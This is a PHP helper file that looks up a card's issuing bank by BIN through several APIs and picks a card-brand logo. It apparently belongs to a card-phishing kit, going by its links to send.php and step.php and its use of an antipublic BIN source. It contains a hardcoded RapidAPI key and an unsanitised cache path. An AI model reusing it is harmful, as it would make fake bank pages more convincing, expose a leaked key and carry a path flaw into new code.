<?php
/**
 * Shared bank utility functions used by step.php, app.php, send.php
 */

define('CARD_IMAGE_PATHS', [
    'visa' => './res/visa2.png',
    'mastercard' => './res/Mastercard-logo.svg.webp',
    'amex' => './res/amex.svg',
    'default' => './res/blank.svg'
]);

function getCardInfo($cardNumber)
{
    $firstDigit = substr($cardNumber, 0, 1);
    switch ($firstDigit) {
        case '4':
            return ['imagePath' => CARD_IMAGE_PATHS['visa'], 'backgroundColor' => 'blue'];
        case '5':
            return ['imagePath' => CARD_IMAGE_PATHS['mastercard'], 'backgroundColor' => 'red'];
        case '3':
            return ['imagePath' => CARD_IMAGE_PATHS['amex'], 'backgroundColor' => 'green'];
        default:
            return ['imagePath' => CARD_IMAGE_PATHS['default'], 'backgroundColor' => 'blue'];
    }
}

function getBank($bin)
{
    $cachePath = __DIR__ . "/cache/{$bin}.json";
    if (file_exists($cachePath)) {
        return json_decode(file_get_contents($cachePath), true);
    }

    $apis = [
        "https://binlist.io/lookup/$bin",
        "https://lookup.binlist.net/$bin",
        "https://bin-ip-checker.p.rapidapi.com/?bin=$bin",
        "https://bins.antipublic.cc/bins/$bin"
    ];

    foreach ($apis as $index => $binCheckUrl) {
        $curl = curl_init();
        $curlOptions = [
            CURLOPT_URL => $binCheckUrl,
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 10
        ];

        if (strpos($binCheckUrl, 'rapidapi.com') !== false) {
            $curlOptions[CURLOPT_HTTPHEADER] = [
                'X-RapidAPI-Host: bin-ip-checker.p.rapidapi.com',
                'X-RapidAPI-Key: 0e1b7632bemsh7bc8a3f69376d61p12994bjsnad4d4f14f320'
            ];
        }

        curl_setopt_array($curl, $curlOptions);
        $content = curl_exec($curl);
        $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
        curl_close($curl);

        if ($content !== false && $httpCode === 200) {
            $data = json_decode($content, true);
            if ($data && !empty($data)) {
                $normalizedData = normalizeApiResponse($data, $index);
                if ($normalizedData && $normalizedData['bank'] !== 'Unknown Bank') {
                    file_put_contents($cachePath, json_encode($normalizedData, JSON_PRETTY_PRINT));
                    return $normalizedData;
                }
            }
        }
    }

    return ['bank' => 'Unknown Bank', 'country' => 'Unknown Country', 'type' => 'Unknown Type'];
}

function normalizeApiResponse($data, $apiIndex)
{
    switch ($apiIndex) {
        case 0: // binlist.io
        case 1: // lookup.binlist.net
            return [
                'bank' => isset($data['bank']['name']) ? $data['bank']['name'] : (isset($data['bank']) && is_string($data['bank']) ? $data['bank'] : 'Unknown Bank'),
                'country' => $data['country']['alpha2'] ?? 'Unknown Country',
                'type' => $data['type'] ?? 'Unknown Type'
            ];
        case 2: // rapidapi
            return [
                'bank' => $data['BIN']['bank'] ?? $data['bank'] ?? 'Unknown Bank',
                'country' => $data['BIN']['country'] ?? $data['country'] ?? 'Unknown Country',
                'type' => $data['BIN']['type'] ?? $data['type'] ?? 'Unknown Type'
            ];
        case 3: // antipublic
            return [
                'bank' => $data['bank_name'] ?? $data['bank'] ?? 'Unknown Bank',
                'country' => $data['country_code'] ?? $data['country'] ?? 'Unknown Country',
                'type' => $data['card_type'] ?? $data['type'] ?? 'Unknown Type'
            ];
        default:
            return null;
    }
}

function updateTemplateWithBankInfo($bankInfo, $bin)
{
    $_SESSION['bankInfo'] = $bankInfo;

    $cacheDir = __DIR__ . "/cache";
    if (!is_dir($cacheDir)) {
        mkdir($cacheDir, 0755, true);
    }

    $cacheFile = $cacheDir . "/" . $bin . ".json";
    $cacheData = [
        'bank' => $bankInfo['bank'],
        'country' => $bankInfo['country'],
        'type' => $bankInfo['type'],
        'timestamp' => time()
    ];

    // Preserve existing logo if cached
    if (file_exists($cacheFile)) {
        $existing = json_decode(file_get_contents($cacheFile), true);
        if (!empty($existing['logo'])) {
            $cacheData['logo'] = $existing['logo'];
        }
    }

    file_put_contents($cacheFile, json_encode($cacheData, JSON_PRETTY_PRINT));
}
